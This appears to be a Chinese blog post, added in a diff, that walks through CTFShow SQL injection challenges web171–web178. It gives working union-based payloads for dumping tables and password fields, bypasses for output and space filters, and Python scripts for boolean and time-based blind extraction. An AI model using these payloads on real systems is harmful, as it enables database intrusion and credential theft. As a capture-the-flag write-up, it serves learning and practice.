@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="专题训练之 SQL 注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFShowSQL注入">
+<meta property="og:url" content="https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="专题训练之 SQL 注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119210952941.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119212900435.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119213646569.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119213755279.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119215933306.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120085243761.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120092708256.png">
+<meta property="og:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120093917720.png">
+<meta property="article:published_time" content="2023-01-19T12:43:37.000Z">
+<meta property="article:modified_time" content="2023-01-20T01:40:10.821Z">
+<meta property="article:author" content="MirRoR4s">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://example.com/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119210952941.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTFShowSQL注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/01/18/CTFShow-Xss/index.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&text=CTFShowSQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&is_video=false&description=CTFShowSQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTFShowSQL注入&body=Check out this article: https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&title=CTFShowSQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&name=CTFShowSQL注入&description=&lt;!--toc--&gt;
+
+&lt;p&gt;专题训练之 SQL 注入&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://example.com/2023/01/19/CTFShowSQL%E6%B3%A8%E5%85%A5/index.html&t=CTFShowSQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-zhu-ru"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web171"><span class="toc-number">1.1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web172"><span class="toc-number">1.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web173"><span class="toc-number">1.3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web174"><span class="toc-number">1.4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web175"><span class="toc-number">1.5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qian-yan"><span class="toc-number">1.6.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web176"><span class="toc-number">1.7.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web177"><span class="toc-number">1.8.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web178"><span class="toc-number">1.9.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web179"><span class="toc-number">1.10.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web180"><span class="toc-number">1.11.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-kao-lian-jie"><span class="toc-number">1.12.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTFShowSQL注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">MirRoR4s</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-19T12:43:37.000Z" itemprop="datePublished">2023-01-19</time>
+        
+        (Updated: <time datetime="2023-01-20T01:40:10.821Z" itemprop="dateModified">2023-01-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTFShow/">CTFShow</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <!--toc-->
+
+<p>专题训练之 SQL 注入</p>
+<span id="more"></span>
+
+<h2 id="sql-zhu-ru"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入<a href="#sql-zhu-ru" class="header-anchor">#</a></h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171<a href="#web171" class="header-anchor">#</a></h3><p>页面已经回显了 sql 语句</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username !=<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id = <span class="string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="string">&#x27;].&quot;&#x27;</span> <span class="keyword">limit</span> <span class="number">1</span>;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>存在字符型注入，闭合方式是单引号。</p>
+<p>输入 1’ 报错</p>
+<p>输入 1’–+ 回显正常</p>
+<p>直接注入</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database();--+</span><br><span class="line"></span><br><span class="line">ctfshow_user</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_schema=database() <span class="built_in">and</span> table_name=<span class="string">&quot;ctfshow_user&quot;</span>;--+</span><br><span class="line">id,username,password</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,username,password) <span class="keyword">from</span> ctfshow_user --+</span><br><span class="line">ctfshow&#123;<span class="number">1e45</span>dfa5<span class="number">-7</span>de2<span class="number">-4046</span><span class="number">-8028</span><span class="number">-656e0</span>fde7e3f&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172<a href="#web172" class="header-anchor">#</a></h3><p>和上题几乎一模一样，但是 flag 并不在 ctfshow_user 表中,以及 username 不能等于 flag，这个并不影响到我们，毕竟我们把多行返回的数据拼成了一行(●’◡’●)</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>拼接sql语句查找指定ID用户</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="regexp">//</span>检查结果是否有flag</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>试试直接读取文件 &#x2F;flag，但是发现并不在这里。但是经过测试是可以读取的，因为我读到了当前的 php 文件</p>
+<blockquote>
+<p>关于 mysql 读取文件看这篇文章 [mysql几种读取文</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1e4r/articles/8618692.html">件方法的使用 - c1e4r - 博客园 (cnblogs.com)</a></p>
+<p>也可以看看 group_concat 函数的相关信息 <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/mysql-group_concat-function/">MySQL | Group_CONCAT() Function - GeeksforGeeks</a></p>
+</blockquote>
+<p>后面发现有一个 ctfshow_user2 表，flag 就在这个表里</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,group<span class="constructor">_concat(<span class="params">id</span>,<span class="params">username</span>,<span class="params">password</span>)</span> from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173<a href="#web173" class="header-anchor">#</a></h3><p>和上题几乎一模一样，但是 flag 又换了一个表。同时这是一个有过滤的字符型注入，添加了检查结果中是否匹配正则表达式 <code>/flag/i</code> ，</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="regexp">//</span>拼接sql语句查找指定ID用户</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="regexp">//</span>检查结果是否有flag</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>针对这种情况，我们可以将查询结果进行编码，mysql 中常见的编码函数有</p>
+<ul>
+<li>to_base64</li>
+<li>hex</li>
+</ul>
+<p>添加hex函数绕过正则过滤</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,hex((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username=<span class="string">&#x27;flag&#x27;</span>)) %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174<a href="#web174" class="header-anchor">#</a></h3><p>和前几题的查询语句一样，但是在回显的时候不能出现 flag 字符和数字</p>
+<p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119210952941.png" alt="image-20230119210952941"></p>
+<p>不幸地是，这两种编码都会包含到数字，所以这题我们不能采用联合注入了，要使用盲注。注意查询的时候访问的是 v4.php </p>
+<p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119212900435.png" alt="image-20230119212900435"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://168b1d40-414d-4b42-a7cd-1cb5fd00bfe6.challenge.ctf.show:8080/api/v4.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>):</span><br><span class="line">    response = requests.get(url + payload.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        point = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">            start = point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = point</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175<a href="#web175" class="header-anchor">#</a></h3><p>平台说这是最后一个无过滤的 sql 注入~ 但是为什么回显还是有过滤？？</p>
+<p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119213646569.png" alt="image-20230119213646569"></p>
+<p>过滤了 ascii 0-127,相当于没有回显，所以改上题的布尔盲注为时间盲注，同样查询语句是在 v5.php！</p>
+<p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119213755279.png" alt="image-20230119213755279"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload <span class="operator">=</span> &quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,sleep(2),1) %23&quot;</span><br><span class="line">url <span class="operator">=</span> &quot;http://dc63c6a5-aa8b-4e21-a765-56eb704e4809.challenge.ctf.show:8080/api/v5.php?id=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test_chr(index: <span class="type">int</span>, <span class="keyword">offset</span>: <span class="type">int</span>):</span><br><span class="line">    try:</span><br><span class="line">        response <span class="operator">=</span> requests.get(url <span class="operator">+</span> payload.format(index, <span class="keyword">offset</span>), timeout<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">flag <span class="operator">=</span> &quot;&quot;</span><br><span class="line">while <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">start</span> <span class="operator">=</span> <span class="number">32</span></span><br><span class="line">    <span class="keyword">end</span> <span class="operator">=</span> <span class="number">127</span></span><br><span class="line">    while <span class="literal">True</span>:</span><br><span class="line">        if <span class="built_in">abs</span>(<span class="keyword">start</span><span class="operator">-</span><span class="keyword">end</span>) <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">start</span> <span class="operator">=</span><span class="operator">=</span> <span class="keyword">end</span>:</span><br><span class="line">            break</span><br><span class="line">        point <span class="operator">=</span> (<span class="keyword">start</span> <span class="operator">+</span> <span class="keyword">end</span>) <span class="operator">/</span><span class="operator">/</span> <span class="number">2</span></span><br><span class="line">        if test_chr(index, point):</span><br><span class="line">            <span class="keyword">start</span> <span class="operator">=</span> point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">end</span> <span class="operator">=</span> point</span><br><span class="line">    if <span class="keyword">end</span> <span class="operator">&lt;</span> <span class="keyword">start</span>:</span><br><span class="line">        <span class="keyword">end</span> <span class="operator">=</span> <span class="keyword">start</span></span><br><span class="line">    flag <span class="operator">+</span><span class="operator">=</span> chr(<span class="keyword">end</span>)</span><br><span class="line">    print(f&quot;[*] flag: &#123;flag&#125;&quot;)</span><br><span class="line">    index <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>以下题目开始过滤啦</p>
+</blockquote>
+<h3 id="qian-yan"><a href="#前言" class="headerlink" title="前言"></a>前言<a href="#qian-yan" class="header-anchor">#</a></h3><p>以下题目大都过滤了空格，一般代替空格的字符串有</p>
+<ul>
+<li>%09</li>
+<li>%0a</li>
+<li>%0b</li>
+<li>%0d</li>
+<li>%0c</li>
+</ul>
+<h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176<a href="#web176" class="header-anchor">#</a></h3><p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230119215933306.png" alt="image-20230119215933306"></p>
+<p>这里其实是对 select 进行了过滤，大小写就能绕过。但是也可以如下拿 flag</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="symbol">&#x27;or</span><span class="symbol">&#x27;1</span><span class="symbol">&#x27;=</span><span class="symbol">&#x27;1</span> </span><br></pre></td></tr></table></figure>
+
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177<a href="#web177" class="header-anchor">#</a></h3><p>这里应该是过滤掉了空格，只要存在空格就把整个语句都清空。用 <code>%09</code> 替代空格即可</p>
+<p>踩坑点：</p>
+<p>使用 –+ 作为注释符会失效，因为最后的 + 在url解码后被识别为空格，然后触发了题目的 waf</p>
+<p>所以可以将 # 编码为 %23 来作为注释符，不编码的话 # 在url中有特殊含义会有些问题</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="variable">%09</span>union<span class="variable">%09</span><span class="keyword">select</span><span class="variable">%091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>(<span class="keyword">select</span><span class="variable">%09</span>password<span class="variable">%09</span>from<span class="variable">%09</span>ctfshow_user<span class="variable">%09</span>where<span class="variable">%09</span>username<span class="variable">%09</span><span class="operator">=</span><span class="variable">%09</span>&#x27;flag&#x27;)<span class="variable">%09</span><span class="variable">%23</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178<a href="#web178" class="header-anchor">#</a></h3><p><img src="/images/CTFShowSQL%E6%B3%A8%E5%85%A5/image-20230120085243761.png" alt="image-20230120085243761"></p>
+<p>依旧过滤了空格，上一题的答案还能用。不知道为什么这样的语句行不通，所以具体过滤了什么呢？</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="variable">%09</span>union<span class="variable">%09</span><span class="keyword">select</span><span class="variable">%091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>(group_concat(password)<span class="variable">%09</span>from<span class="variable">%09</span>ctfshow_user)<span class="variable">%23</span> //这样不行</span><br><span class="line"><span class="number">1</span>&#x27;<span class="variable">%09</span>union<span class="variable">%09</span><span class="keyword">select</span><span class="variable">%091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>group_concat(id<span class="punctuation">,</span>password)from<span class="variable">%09</span>ctfshow_user<span class="variable">%23</span> //这样可以</span><br><span class="line"></span><br><span class="line">猜测是回显的数据太多了，看来 group_concat 还是精简为妙</span><br></pre></td></tr></table></figure>
+
+<p>但是上题答案可以</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;<span class="variable">%09</span>union<span class="variable">%09</span><span class="keyword">select</span><span class="variable">%091</span><span class="punctuation">,</span><span class="number">2</span><span class="punctuation">,</span>(<span class="keyword">select</span><span class="variable">%09</span>password<span class="variable">%09</span>from<span class="variable">%09</span>ctfshow_user<span class="variable">%09</span>where<span class="variable">%09</span>username<span class="variable">%09</span><span class="operator">=</span><span class="variable">%09</span>&#x27;flag&#x27;)<span class="variable">%09</span><span class="variable">%23</span></span><br></pre></td></tr></table></figure>
+
